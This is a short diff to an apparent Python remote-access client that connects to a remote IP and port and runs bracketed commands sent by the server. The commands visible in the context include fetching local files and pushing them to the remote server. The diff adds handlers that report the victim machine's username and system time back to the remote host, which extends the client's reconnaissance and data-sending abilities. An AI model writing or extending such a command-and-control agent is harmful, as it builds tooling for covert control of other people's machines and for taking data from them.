@@ -9,6 +9,8 @@ from datetime import datetime
 from sys import exit,exc_info
 from signal import SIGTERM
 from random import randint, uniform, choice
+from datetime import datetime
+from getpass import getuser
 import argparse,base64
 
 ENCODING_LST = ['utf-8','cp1252']
@@ -145,6 +147,11 @@ TZdCKivQ2PsE9Uw8BwCZYJI=
 def push_uuid(conn):
     send_data(conn, UUID)
 
+def get_system_time(conn):
+    now = datetime.now()
+    current_time = now.strftime("%H:%M:%S")
+    return current_time
+
 def delete_keys():
     try:
         remove("client_key")
@@ -234,6 +241,10 @@ def get_cwd():
     CURRENT_WORKING_DIR = getcwd()
     if VERBOSE:
         print_info("PWD: {}".format(CURRENT_WORKING_DIR))
+
+def get_user():
+    username = getuser()
+    return username
 
 def change_cwd(path):
     try:
@@ -348,6 +359,12 @@ def connect(remote_ip=remote_ip, remote_port=remote_port):
                 callback_port(conn,data)
             elif "[UUID]" in data:
                 push_uuid(conn)
+            elif "[time]" in data:
+                time = get_system_time(conn)
+                send_data(conn,time)
+            elif "[user]" in data:
+                username = get_user()
+                send_data(conn,username)
             elif "[get]" in data:  #find file locally then push to remote server
                 if VERBOSE:
                     print_info("Received GET")
